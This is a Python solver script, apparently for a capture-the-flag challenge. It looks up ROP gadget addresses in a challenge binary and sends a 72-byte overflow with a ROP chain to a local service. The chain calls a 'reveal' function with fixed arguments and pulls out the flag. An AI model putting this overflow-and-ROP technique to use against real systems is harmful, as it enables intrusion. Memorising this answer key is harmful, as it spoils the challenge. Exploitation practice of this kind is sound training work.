#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import socket
import struct
import subprocess
from pathlib import Path


ARG1 = 0x1337C0DECAFEF00D
ARG2 = 0x4142434445464748
ARG3 = 0xDEADBEEF10203040
FLAG_RE = re.compile(rb"flag\{[a-zA-Z0-9_\-]+\}")


def symbol_address(binary: Path, name: str) -> int:
    output = subprocess.check_output(["nm", "-an", binary], text=True)
    for line in output.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[2] == name:
            return int(parts[0], 16)
    raise SystemExit(f"symbol not found: {name}")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    host = os.getenv("HOST", "127.0.0.1")
    port = int(os.getenv("PORT", "8080"))

    ret = symbol_address(binary, "gadget_ret")
    pop_rdi = symbol_address(binary, "gadget_pop_rdi")
    pop_rsi = symbol_address(binary, "gadget_pop_rsi")
    pop_rdx = symbol_address(binary, "gadget_pop_rdx")
    reveal = symbol_address(binary, "reveal")

    payload = b"A" * 72
    payload += struct.pack("<Q", ret)
    payload += struct.pack("<Q", pop_rdi)
    payload += struct.pack("<Q", ARG1)
    payload += struct.pack("<Q", pop_rsi)
    payload += struct.pack("<Q", ARG2)
    payload += struct.pack("<Q", pop_rdx)
    payload += struct.pack("<Q", ARG3)
    payload += struct.pack("<Q", reveal)

    with socket.create_connection((host, port), timeout=5) as conn:
        try:
            conn.recv(256)
        except OSError:
            pass
        conn.sendall(payload)
        conn.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)

    data = b"".join(chunks)
    match = FLAG_RE.search(data)
    if not match:
        raise SystemExit("flag not found")
    print(match.group(0).decode())


if __name__ == "__main__":
    main()
